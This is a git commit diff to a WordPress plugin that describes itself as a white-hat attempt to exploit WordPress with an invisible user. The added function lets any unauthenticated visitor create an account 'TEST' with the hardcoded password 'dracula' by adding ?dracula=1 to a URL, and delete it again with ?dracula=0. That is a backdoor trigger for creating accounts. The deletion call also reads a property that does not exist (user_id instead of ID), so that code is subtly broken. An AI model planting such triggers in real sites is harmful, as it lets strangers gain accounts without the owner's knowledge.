3b1ff28367ea859af7def12360cb680b76d94ff6
Kaiser Franz Josef <wecodemore@gmail.com>
2014-03-23 19:14:42 +0100

    Added a second function that creates/deletes a user - testing purpose only.

--- Bootstrap.php
+++ Bootstrap.php
@@ -5,10 +5,11 @@
  * Description: An attempt to exploit WordPress with an invisible user. The white hat way.
  */
 
-add_action( 'wp_loaded', 'initAnnoyingUser' );
-function initAnnoyingUser()
+add_action( 'wp_loaded', 'initDracula' );
+function initDracula()
 {
 	static $queryString;
+	$arg = 'user-exploit';
 
 	NULL === $queryString
 	&& isset( $_SERVER['QUERY_STRING'] )
@@ -16,10 +17,46 @@ function initAnnoyingUser()
 
 	if (
 		empty( $queryString )
-		OR ! isset( $queryString['user-exploit'] )
-		OR '1' !== $queryString['user-exploit']
+		OR ! isset( $queryString[ $arg ] )
+		OR '1' !== $queryString[ $arg ]
 	)
 		return;
 
 	echo '<h1>TEST</h1>';
+}
+
+
+add_action( 'wp_loaded', 'testDracula' );
+function testDracula()
+{
+	static $queryString;
+	$arg  = 'dracula';
+	$mail = 'mail@example.com';
+
+	NULL === $queryString
+	&& isset( $_SERVER['QUERY_STRING'] )
+	AND parse_str( $_SERVER['QUERY_STRING'], $queryString );
+
+	if (
+		empty( $queryString )
+		OR ! isset( $queryString[ $arg ] )
+		OR ! in_array( $queryString[ $arg ], array( '0', '1' ) )
+	)
+		return;
+
+	switch ( $queryString[ $arg ] )
+	{
+		case '1' :
+			$user_id = wp_create_user(
+				'TEST',
+				'dracula',
+				$mail
+			);
+			break;
+
+		default;
+		case '0' :
+			$deleted = wp_delete_user( get_user_by( 'email', $mail )->user_id );
+			break;
+	}
 }
